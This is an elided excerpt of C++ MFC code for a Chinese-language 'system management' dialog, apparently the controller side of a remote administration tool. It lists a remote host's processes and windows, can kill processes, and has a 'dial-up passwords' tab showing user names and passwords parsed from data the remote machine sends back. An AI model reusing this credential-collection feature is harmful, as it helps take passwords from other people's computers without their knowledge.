...
void CSystemDlg::ShowProcessList()
{
	...
	for (; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
        ...
        dwOffset += sizeof(DWORD)+lstrlen(strExeFile) * sizeof(TCHAR)+lstrlen(strProcessName) * sizeof(TCHAR) + 2 * sizeof(TCHAR);
	}
	...
	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		for (int j = 0; j < 6; j++)
		{
			...
			if (j > 0)
			{
                USES_CONVERSION;
                if (j == 1)
					m_list_dialupass.InsertItem(i, A2W(lpString));
				else
                    m_list_dialupass.SetItemText(i, j - 1, A2W(lpString));
			}
			dwOffset += lstrlenA(lpString) + 1;
		}
	}
...
BOOL CSystemDlg::OnInitDialog() 
{
	...
	str.Format(_T("\\\\%s - 系统管理"), bResult != INVALID_SOCKET ? CStringW(inet_ntoa(sockAddr.sin_addr)) : _T(""));
	SetWindowText(str);
	
	m_tab.InsertItem(0, _T("进程管理"));
	m_tab.InsertItem(1, _T("窗口管理"));
	m_tab.InsertItem(2, _T("拨号密码"));

	m_list_process.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_list_process.InsertColumn(0, _T("映像名称"), LVCFMT_LEFT, 100);
	m_list_process.InsertColumn(1, _T("PID"), LVCFMT_LEFT, 50);
	m_list_process.InsertColumn(2, _T("程序路径"), LVCFMT_LEFT, 400);

	m_list_windows.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_list_windows.InsertColumn(0, _T("PID"), LVCFMT_LEFT, 50);
	m_list_windows.InsertColumn(1, _T("窗口名称"), LVCFMT_LEFT, 300);

	m_list_dialupass.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_list_dialupass.InsertColumn(0, _T("名称"), LVCFMT_LEFT, 50);
	m_list_dialupass.InsertColumn(1, _T("用户"), LVCFMT_LEFT, 75);
	m_list_dialupass.InsertColumn(2, _T("密码"), LVCFMT_LEFT, 75);
	m_list_dialupass.InsertColumn(3, _T("电话/主机"), LVCFMT_LEFT, 102);
	m_list_dialupass.InsertColumn(4, _T("设备"), LVCFMT_LEFT, 105);
    //原来的，by zhangyl
    //m_list_dialupass.InsertColumn(5, _T("设备"), LVCFMT_LEFT, 105);
...
void CSystemDlg::AdjustList()
{
    ...
    if (::IsWindow(m_list_process.m_hWnd))
        m_list_process.MoveWindow(&rectList);
    if (::IsWindow(m_list_windows.m_hWnd))
	    m_list_windows.MoveWindow(&rectList);
    if (::IsWindow(m_list_dialupass.m_hWnd))
...
void CSystemDlg::OnKillprocess() 
{
	...
	TCHAR *lpTips = _T("警告: 终止进程会导致不希望发生的结果，\n")
		_T("包括数据丢失和系统不稳定。在被终止前，\n")
		_T("进程将没有机会保存其状态和数据。");
	CString str;
	...
	if (::MessageBox(m_hWnd, str, _T("进程结束警告"), MB_YESNO|MB_ICONQUESTION) == IDNO)
		return;
